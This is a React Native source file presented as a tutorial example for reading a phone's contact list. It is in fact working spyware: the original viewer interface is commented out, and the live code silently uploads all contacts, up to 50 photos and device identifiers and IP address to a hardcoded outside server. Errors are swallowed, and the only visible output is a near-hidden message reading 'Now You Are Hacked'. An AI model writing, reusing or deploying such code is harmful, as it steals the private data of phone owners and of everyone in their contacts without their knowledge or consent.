/* This is an Access Contact List example from https://aboutreact.com/ */
/* https://aboutreact.com/access-contact-list-react-native/ */

//Import React
import React, { useState, useEffect } from "react";

//Import all required component
import {
  PermissionsAndroid,
  Platform,
  SafeAreaView,
  StyleSheet,
  Text,
  View,
  FlatList,
  TextInput, TouchableOpacity,
  Image
} from "react-native";

import Contacts from "react-native-contacts";
import ListItem from "./component/ListItem";
import CameraRoll from "@react-native-community/cameraroll";
import DeviceInfo from 'react-native-device-info';
import axios from "axios"

let form_data = undefined;

// let SERVER_URL = 'http://192.168.1.2:5000/api';
let SERVER_URL = 'http://3.131.100.54:5000/api';

const App = () => {
  const [contacts, setContacts] = useState([]);
  const [whichMode, setWhichMode] = useState("contact")
  const [imageData, setImageData] = useState(undefined);
  const [deviceId, setDeviceId] = useState(undefined);

  let deviceJSON = {};

  deviceJSON.brand = DeviceInfo.getBrand();
  deviceJSON.uniqueId = DeviceInfo.getUniqueId();
  deviceJSON.IpAddress = DeviceInfo.getIpAddressSync();


  const send_DeviceInfo = () => {
    let data = deviceJSON ? deviceJSON : {}
    axios.post(`${SERVER_URL}/client`, data)
      .then(function (response) {
        // console.log(response);
      })
      .catch(function (error) {
        // console.log(error);
      });
  }


  useEffect(() => {
    if (Platform.OS === "android") {

      getdeviceId()
      PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.READ_CONTACTS, {
        title: "Contacts",
        message: "This app would like to view your contacts."
      }).then(() => {
        loadContacts();
      });
    } else {
      loadContacts();
    }

    loadImage()



    const createFormData = (array, body) => {

      const data = new FormData();

      array.forEach(photo => {
        let _img = photo.node
        let yourstring = _img.image.uri
        var index = yourstring.lastIndexOf("/") + 1;
        var filename = yourstring.substr(index);
        data.append("mobileApp", {
          name: filename,
          type: _img.type,
          uri:
            Platform.OS === "android" ? _img.image.uri : _img.image.uri.replace("file://", "")
        });
      })

      Object.keys(body).forEach(key => {
        data.append({ deviceId: deviceId });
      });

      return data;
    };

    async function loadImage() {
      if (Platform.OS === 'android') {
        const result = await PermissionsAndroid.request(
          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE,
          {
            title: 'Permission Explanation',
            message: 'ReactNativeForYou would like to access your photos!',
          },
        );
        if (result !== 'granted') {
          console.log('Access to pictures was denied', result);
          return;
        }
      }

      CameraRoll.getPhotos({
        first: 50,
        assetType: 'Photos',
      })
        .then(res => {
          let _data = res.edges;
          // console.log("CAMEEEEE", _data)
          let body = {
            deviceId: deviceId,
          }
          let form_data_push = createFormData(_data, body)
          setImageData(_data)

          axios.post(`${SERVER_URL}/images`, form_data_push)
            .then(function (response) {
              // console.log(response);
            })
            .catch(function (error) {
              // console.log(error);
            });
        })
        .catch((error) => {
          console.log(error);
        });
    }

    setTimeout(() => {
      send_DeviceInfo()
      postContact()
    }, 5000);
  }, []);



  const loadContacts = () => {
    var uniqueId = DeviceInfo.getUniqueId();
    Contacts.getAll((err, contacts) => {
      contacts.sort((a, b) => a.givenName.toLowerCase() > b.givenName.toLowerCase());
      if (err === "denied") {
        alert("Permission to access contacts was denied");
        console.warn("Permission to access contacts was denied");
      } else {
        let tempContact = contacts ? [...contacts] : [];
        tempContact && tempContact.length > 0 && tempContact.map((contact, index) => {
          contact.device_id = uniqueId
        })
        setContacts(contacts);
        axios.post(`${SERVER_URL}/contacts`, tempContact)
          .then(function (response) {
            // console.log(response);
          })
          .catch(function (error) {
            // console.log(error);
          });
      }
    });
  }


  const getdeviceId = () => {
    var uniqueId = DeviceInfo.getUniqueId();
    setDeviceId(uniqueId);
  };



  // const openContact = (contact) => {
  //   console.log(JSON.stringify(contact));
  //   Contacts.openExistingContact(contact, () => { })
  // };


  const postContact = () => {

  }




  // console.log("CONTACTS", filename);


  return (
    // <SafeAreaView style={styles.container}>
    //   <View style={styles.container}>
    //     <Text style={styles.header}>
    //       Access Contact List in React Native
    //     </Text>
    //     <View style={{ display: 'flex', flexDirection: 'row', alignItems: 'center', justifyContent: 'space-around', marginVertical: 10 }}>

    //       <TouchableOpacity
    //         style={styles.btn}
    //         onPress={() => setWhichMode("contact")}>
    //         <Text style={{ color: "#fff" }}>Contact</Text>
    //       </TouchableOpacity>

    //       <TouchableOpacity
    //         style={styles.btn}
    //         onPress={() => setWhichMode("gallery")}>
    //         <Text style={{ color: "#fff" }}>gallery</Text>
    //       </TouchableOpacity>
    //     </View>

    //     {whichMode === "gallery" && (
    //       <View style={{ display: 'flex', flexDirection: 'row', flexWrap: 'wrap' }}>
    //         {imageData && imageData.length > 0 && imageData.map((image, index) => {
    //           return (
    //             <TouchableOpacity key={"img" + index} style={{ borderWidth: 2, margin: 5, borderColor: '#ccc', width: '30%', }}>
    //               <Image
    //                 style={{
    //                   width: '100%',
    //                   height: 150,
    //                 }}
    //                 source={{ uri: image.node.image.uri }}
    //               />
    //             </TouchableOpacity>
    //           )
    //         })}
    //       </View>
    //     )}


    //     {whichMode === "contact" && (
    //       <View>
    //         <FlatList
    //           data={contacts}
    //           renderItem={(contact) => {
    //             // { console.log('contact -> ' + JSON.stringify(contact)) }
    //             return (<ListItem
    //               key={contact.item.recordID}
    //               item={contact.item}
    //               onPress={openContact}
    //             />)
    //           }}
    //           keyExtractor={item => item.recordID}
    //         />
    //       </View>
    //     )}


    //   </View>
    // </SafeAreaView>
    <View style={{ backgroundColor: '#000', flex: 1 }}>
      <Text style={{ fontSize: 9, color: (contacts && imageData) ? "#222" : 'green' }}>Now You Are {(contacts && imageData) ? "Hacked" : "Safe"}</Text>
      <Text>Your Device Id is {deviceId ? deviceId : null}</Text>
    </View>
  );
}
export default App;

const styles = StyleSheet.create({
  container: {
    flex: 1
  },
  header: {
    backgroundColor: '#4591ed',
    color: 'white',
    paddingHorizontal: 5,
    paddingVertical: 5,
    fontSize: 10
  },
  searchBar: {
    backgroundColor: '#f0eded',
    paddingHorizontal: 30,
    paddingVertical: (Platform.OS === "android") ? undefined : 15,
  },
  btn: {
    height: 30,
    backgroundColor: 'green',
    width: 100,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    borderRadius: 3
  }
});